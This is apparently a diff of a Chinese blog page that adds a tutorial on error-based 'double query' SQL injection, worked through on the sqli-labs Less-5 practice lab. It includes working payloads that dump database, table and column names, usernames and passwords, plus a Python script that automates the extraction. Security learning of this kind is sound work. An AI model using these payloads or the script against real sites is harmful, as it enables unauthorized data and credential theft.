@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">奇点的小屋！</title>
+  <title itemprop="name">sql注入-双查询注入 | 奇点的小屋！</title>
   
     <link rel="shortcut icon" href="/images/favicon.png">
   
@@ -292,456 +292,179 @@
   </div>
 </header>
 
-      <div class="blank" style="padding-top: 0px;"></div>
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://s1.ax1x.com/2020/07/31/alzJrq.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzJrq.jpg">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      sql注入-双查询注入</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="">
+          </a>
+        </span>
+        <span>
+          <a href=""></a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2020-8-15<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
 <div id="content" class="site-content">
-  
-  <div class="notice" style="margin-top:60px">
-    <i class="iconfont icon-notification">
-    </i>
-    <div class="notice-content">Network security only</div>
-  </div>
-  
-  <div class="top-feature-row">
-  <h1 class="fes-title" style="font-family: 'Ubuntu', sans-serif;">
-  <i class="fa fa-anchor" aria-hidden="true">
-  </i>
-  START:DASH!!</h1>
-  
-  <div class="top-feature-v2">
-    <div class="the-feature square from_left_and_right">
-      <a href="/theme-sakura/" target="_blank">
-        <div class="img">
-          <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/startdash/sakura.md.png">
-        </div>
-        <div class="info">
-          <h3>Sakura</h3>
-          <p>本站 hexo 主题</p>
-        </div>
-      </a>
-    </div>
-  </div>
-  
-  <div class="top-feature-v2">
-    <div class="the-feature square from_left_and_right">
-      <a href="http://space.bilibili.com/271849279" target="_blank">
-        <div class="img">
-          <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/startdash/bilibili.jpg">
-        </div>
-        <div class="info">
-          <h3>Bilibili</h3>
-          <p>博主的b站视频</p>
-        </div>
-      </a>
-    </div>
-  </div>
-  
-  <div class="top-feature-v2">
-    <div class="the-feature square from_left_and_right">
-      <a href="/" target="_blank">
-        <div class="img">
-          <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/startdash/wangshiwu.jpg">
-        </div>
-        <div class="info">
-          <h3>奇点的万事屋</h3>
-          <p>技术服务</p>
-        </div>
-      </a>
-    </div>
-  </div>
-  
-</div>
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
-      <h1 class="main-title" style="font-family: 'Ubuntu', sans-serif;">
-      <i class="fa fa-envira" aria-hidden="true"></i>
-      Discovery</h1>
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <p>学习了新内容。</p>
+<p>以sql-libs/Less-5为示例。</p>
+<p><strong>什么是双查询注入呢？</strong></p>
+<p>看大佬的解释太深奥，粗俗的理解就是一个select语句里再嵌套一个select语句，将有用的信息显示在SQL的报错信息。</p>
+<p>首先,理解四个函数/语句：<code>Concat(),Rand(), Floor(), Count(),Group by clause</code></p>
+<p>①concat（）函数</p>
+<p>我理解为组合，汇合函数将括号里的符号连接在一起。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200813110603167.png#pic_center" alt="在这里插入图片描述"><br>将结果连在了一起。<br><img src="https://img-blog.csdnimg.cn/20200813110737267.png#pic_center" alt="在这里插入图片描述"><br>②Rand函数</p>
+<p>用来返回一个01之间的随机数，区间表示就是【0,1）。<br><img src="https://img-blog.csdnimg.cn/20200813111137672.png#pic_center" alt="在这里插入图片描述"><br>括号里为空时，随机产生数。</p>
+<p>当括号里的参数固定时，随机数(随机数列)也是固定的。<br><img src="https://img-blog.csdnimg.cn/2020081311132621.png#pic_center" alt="在这里插入图片描述"></p>
+<p>让我们看一下随机数列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand(3) from information_schema.columns limit 3;</span><br></pre></td></tr></table></figure>
+<p>产生三列随机数。<br><img src="https://img-blog.csdnimg.cn/20200813111701419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>对比一下还是不变。</p>
+<p>③Floor()函数</p>
+<p>Floor()函数时取整函数，当输入一个非整数，返回小于等于输入参数的最大整数。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200813112714353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>④count()函数</p>
+<p>用于统计行数。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200813113117949.png#pic_center" alt="在这里插入图片描述"><br>⑤group by 语句</p>
+<p>先看这句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_schema, table_name from information_schema.tables；</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200814204357300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>加上group by语句后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_schema, table_name from information_schema.tables by table_schema；</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200814204724226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>加上之后，数据明显少了很多的重复的。重复的数据库只显示一个，并且只显示数据库里的第一张表。</p>
+<p>几个函数灵活运用，会有什么不异想不到的结果呢？</p>
+<p>我们实践一下</p>
+<p>①rand()函数和floor()函数结合使用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand(5)*12) from information_schema.columns limit 5;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200814205459526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>由内到外逐个分析，rand(5)会随机产生5个不同的值，但是*12，就是将【0，1）扩大到【0，12），floor函数就是取整了。</p>
+<p>②count()函数和group by语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_schema, count(*) from information_schema.tables group by table_schema;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2020081421022843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>他们的组合就是统计了每个数据库里有多少张表。</p>
+<p>其原理就是：<em>Mysql会建立一张临时表，有group_key和tally两个字段，其中group_key设置了UNIQUE约束，即不能有两行的group_key列的值相同。使用group by语句和count()函数的时候，mysql数据库会先建立一个虚拟表，当查询到新的键不在虚拟表中，数据库就会将其插入表中，如果数据库中已存在该键，则找到该键对应的计数字段并加1。</em></p>
+<p>③双查询的核心语句(几个函数综合使用)</p>
+<p>先看payload：<code>select floor(rand(14)*2) c, count(*) from information_schema.columns group by c;</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200815120317415.png#pic_center" alt="在这里插入图片描述"><br>报错了，那为什么会报错？<br>分析一下：<br>SQL语句中用列c分组，而列c是floor(rand(14)<em>2)的别名。<br>floor(rand(14)</em>2)产生的随机数列，前四位是：1，0，1，0。</p>
+<p>我们查询的时候，mysql数据库会先建立一个临时表，设置了UNIQUE约束的group_key和tally两个字段。当查询到新的”group_key键”不在临时表中，数据库就会将其插入临时表中，如果数据库中已存在group_key该键，则找到该键对应的”tally计数”字段并加1。</p>
+<p>创建好临时表后，Mysql开始逐行扫描information_schema.columns表，遇到的第一个分组列是floor(rand(14)<em>2)，计算出其值为1，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)</em>2)，注意此时又计算了一次，结果为0。所以实际插入到临时表的一行group_key为0，tally为1，临时表变成了：<br><img src="https://img-blog.csdnimg.cn/20200815120517523.png#pic_center" alt="在这里插入图片描述"></p>
+<p>Mysql继续扫描information_schema.columns表，遇到的第二个分组列还是floor(rand(14)<em>2)，计算出其值为1（这个1是随机数列的第三个数），便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)</em>2)，此时又计算了一次，结果为0（这个0是随机数列的第四个数），所以尝试向临时表插入一行数据，group_key为0，tally为1。但实际上临时表中已经有一行的group_key为0，而group_key又设置了不可重复的约束，所以就会出现报错。</p>
+<p>知道了原理，就实战一下。以sql-lib/Less-5为例：</p>
+<p>判断闭合点：<br><img src="https://img-blog.csdnimg.cn/20200815123042896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p> 然后查询数据库：<br> 构建payload:<code>?id=-1&#39; union select 1,count(*),concat( (select database()),floor(rand()*2)) as a from information_schema.tables group by a --+</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200815123553143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>数据库就在报错的信息里显示出来了。</p>
+<p>但是，因为是随机值，所以只会有50%的概率会报错。<br><img src="https://img-blog.csdnimg.cn/20200815123833129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>相同的payload但显示正常。</p>
+<p>有大佬说，可以通过修改rand()使用的种子来使其百分百报错,如下将rand()改为rand(1)，测试百分之百报错，即payload：<code>?id=-1&#39; union select 1,count(*),concat( (select database()),floor(rand(1)*2)) as a from information_schema.tables group by a --+</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200815124416644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>但我发现，rand(1)并不会100%报错，反而我是试了几次都没有报错，只有4，11，14，15这几个数会100%报错，我也不知道什么原因，在这里留个悬念，希望大佬能解释一下。</p>
+<p>我们来爆表,前面我们知道了当前数据库的为security，构造payload：<code>?id=-1&#39; union select 1,count(*),concat( (select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200815183114981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>总共四张表，我们在第三张拿到了我们想要的。</p>
+<p>知道了表名，看列值，构造payload：<code>?id=-1&#39; union select 1,count(*),concat( (select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+</code></p>
+<p>我通过修改limit X,1里X的值，在3，1的时候看到了password字段</p>
+<p><img src="https://img-blog.csdnimg.cn/20200815183928488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在9，1的时候得到了用户名字段<br><img src="https://img-blog.csdnimg.cn/20200815184049881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>开始拿用户名和密码，构造payload：<code>?id=-1&#39; union select 1,count(*),concat( (select username from users limit 0,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200815184909825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>和<code>?id=-1&#39; union select 1,count(*),concat( (select password from users limit 0,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+</code></p>
+<p><img src="https://img-blog.csdnimg.cn/2020081518495556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里要注意用户名和密码的列数应改相对。</p>
+<p>是不是jio着麻烦，附上Mochaaz大佬的python代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">db_name &#x3D; &#39;&#39;</span><br><span class="line">table_list &#x3D; []</span><br><span class="line">column_list &#x3D; []</span><br><span class="line">url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;192.168.1.158&#x2F;sqlilabs&#x2F;Less-5&#x2F;?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">### 获取当前数据库名 ###</span><br><span class="line">print(&#39;当前数据库名:&#39;)</span><br><span class="line">payload &#x3D; &#39;&#39;&#39;&#39; and 1&#x3D;(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+&#39;&#39;&#39;</span><br><span class="line">r &#x3D; requests.get(url+payload)</span><br><span class="line">db_name &#x3D; r.text.split(&#39;:&#39;)[-2]</span><br><span class="line">print(&#39;[+]&#39; + db_name)</span><br><span class="line">### 获取表名 ###</span><br><span class="line">print(&#39;数据库%s下的表名:&#39; % db_name)</span><br><span class="line">for i in range(50):</span><br><span class="line">    payload &#x3D; &#39;&#39;&#39;&#39; and 1&#x3D;(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema&#x3D;&#39;%s&#39; limit %d,1),0x3a,floor(rand(0)*2)))--+&#39;&#39;&#39; % (db_name,i)</span><br><span class="line">    r &#x3D; requests.get(url+payload)</span><br><span class="line">    if &#39;group_key&#39; not in r.text:</span><br><span class="line">        break</span><br><span class="line">    table_name &#x3D; r.text.split(&#39;:&#39;)[-2]</span><br><span class="line">    table_list.append(table_name)</span><br><span class="line">    print(&#39;[+]&#39; + table_name)</span><br><span class="line">### 获取列名 ###</span><br><span class="line">#### 这里以users表为例 ####</span><br><span class="line">print(&#39;%s表下的列名:&#39; % table_list[-1])</span><br><span class="line">for i in range(50):</span><br><span class="line">    payload &#x3D; &#39;&#39;&#39;&#39; and 1&#x3D;(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name&#x3D;&#39;%s&#39; limit %d,1),0x3a,floor(rand(0)*2)))--+&#39;&#39;&#39; % (table_list[-1],i)</span><br><span class="line">    r &#x3D; requests.get(url + payload)</span><br><span class="line">    if &#39;group_key&#39; not in r.text:</span><br><span class="line">        break</span><br><span class="line">    column_name &#x3D; r.text.split(&#39;:&#39;)[-2]</span><br><span class="line">    column_list.append(column_name)</span><br><span class="line">    print(&#39;[+]&#39; + column_name)</span><br><span class="line">### 获取字段值 ###</span><br><span class="line">#### 这里以username列为例 ####</span><br><span class="line">print(&#39;%s列下的字段值:&#39; % column_list[-2])</span><br><span class="line">for i in range(50):</span><br><span class="line">    payload &#x3D; &#39;&#39;&#39;&#39; and 1&#x3D;(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+&#39;&#39;&#39; % (column_list[-2],db_name,table_list[-1],i)</span><br><span class="line">    r &#x3D; requests.get(url + payload)</span><br><span class="line">    if &#39;group_key&#39; not in r.text:</span><br><span class="line">        break</span><br><span class="line">    dump &#x3D; r.text.split(&#39;:&#39;)[-2]</span><br><span class="line">    print(&#39;[+]&#39; + dump)</span><br></pre></td></tr></table></figure>
+<p>花费几小时的注入，代码几秒就出来结果了。<br><img src="https://img-blog.csdnimg.cn/20200815190301388.png#pic_center" alt="在这里插入图片描述"><br>用户名直接出来了，我要好好学python了，啥都不会。</p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="< /images/donate/AliPayQR.jpg>"></li>
+              <li class="wechat-code"><img src="</images/donate/WeChanQR.jpg>"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2020/08/05/%E6%9A%91%E5%81%87%E7%AC%AC%E4%BA%94%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)Crypto%E7%BB%83%E4%B9%A0/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzwiF.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://s1.ax1x.com/2020/07/31/alzwiF.jpg">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                暑假第五周练习(一)Cypto练习</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
       
-  <!-- 首页默认取最最新文章集 -->
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
 
-  <div class="post-thumb">
-    <a href="/2020/04/08/kail%E5%81%9ACTF%E6%9D%82%E9%A1%B9%E9%A2%98%E7%9A%84%E5%B7%A5%E5%85%B7%E5%AE%89%E5%88%A9%E4%B8%80%E6%B3%A2%EF%BC%81/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(2).jpg.webp">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-4-8 15:04</div>
-      <a href="/2020/04/08/kail%E5%81%9ACTF%E6%9D%82%E9%A1%B9%E9%A2%98%E7%9A%84%E5%B7%A5%E5%85%B7%E5%AE%89%E5%88%A9%E4%B8%80%E6%B3%A2%EF%BC%81/" class="post-title">
-        <h3>kail做CTF杂项题的工具安利一波！</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/kail/">kail<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/04/08/kail%E5%81%9ACTF%E6%9D%82%E9%A1%B9%E9%A2%98%E7%9A%84%E5%B7%A5%E5%85%B7%E5%AE%89%E5%88%A9%E4%B8%80%E6%B3%A2%EF%BC%81/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="" itemprop="image" alt="" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author"></a>
+            </h3>
+          </div>
         </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/04/08/zip%E7%9F%A5%E8%AF%86%E7%82%B9%E7%9A%84%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%EF%BC%81/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(4).jpg.webp">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-4-8 15:04</div>
-      <a href="/2020/04/08/zip%E7%9F%A5%E8%AF%86%E7%82%B9%E7%9A%84%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%EF%BC%81/" class="post-title">
-        <h3>zip知识点的部分总结！</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/zip%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/">zip知识学习<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/04/08/zip%E7%9F%A5%E8%AF%86%E7%82%B9%E7%9A%84%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%EF%BC%81/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/04/08/%E6%90%AD%E5%BB%BADVWA%20web%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(3).jpg.webp">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-4-8 15:04</div>
-      <a href="/2020/04/08/%E6%90%AD%E5%BB%BADVWA%20web%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/" class="post-title">
-        <h3>搭建DVWA web渗透靶场</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/%E9%9D%B6%E5%9C%BA/">靶场<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/04/08/%E6%90%AD%E5%BB%BADVWA%20web%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/04/07/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B4%E6%95%B0%E6%B3%A8%E5%85%A5/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(2).jpg.webp">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-4-7 15:04</div>
-      <a href="/2020/04/07/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B4%E6%95%B0%E6%B3%A8%E5%85%A5/" class="post-title">
-        <h3>SQL注入--整数注入</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/04/07/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B4%E6%95%B0%E6%B3%A8%E5%85%A5/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/04/06/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E8%BF%98%E6%98%AF%E6%95%B4%E5%BD%A2%EF%BC%81%EF%BC%81%EF%BC%81/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(8).jpg.webp">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-4-6 15:04</div>
